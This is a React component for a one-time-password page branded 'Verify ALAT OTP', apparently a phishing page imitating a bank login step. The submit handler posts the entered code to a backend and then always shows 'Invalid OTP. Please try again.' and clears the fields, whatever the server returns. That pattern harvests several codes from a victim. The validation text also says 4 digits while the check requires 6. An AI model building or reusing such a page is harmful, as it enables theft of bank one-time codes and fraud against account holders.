import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 4 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const resetOtpInputs = () => {
    setOtp(new Array(6).fill(""));
    setValue("otp", "");
    const inputs = document.querySelectorAll(".pin-input");
    inputs.forEach((input) => (input.value = ""));
    inputs[0].focus();
  };

  const submitForm = async (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        setErrorMessage("Invalid OTP. Please try again.");

        resetOtpInputs();
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });

  resetOtpInputs();
  };

  return (
    <div className="pin">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
          </div>
          <div className="hometitle">Verify ALAT OTP</div>
        </div>
        <div className="formSec">
          <div className="input">
            <form className="otpForm" onSubmit={handleSubmit(submitForm)}>
              <div className="formOtp">
                {otp.map((data, index) => (
                  <input
                    key={index}
                    id={`otp-${index}`}
                    type="password"
                    name="otp"
                    maxLength="1"
                    value={data}
                    onChange={(e) => handleChange(e.target, index)}
                    onFocus={(e) => e.target.select()}
                    className="pin-input"
                    inputMode="numeric"
                  />
                ))}
              </div>

              {errorMessage && (
                <div className="error-message">{errorMessage}</div>
              )}
              <FormErrMsg errors={errors} inputName="otp" />

              <div className="buttonSec">
                <button type="submit" disabled={loading}>
                  {loading ? "Loading..." : "Log In"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Otp;
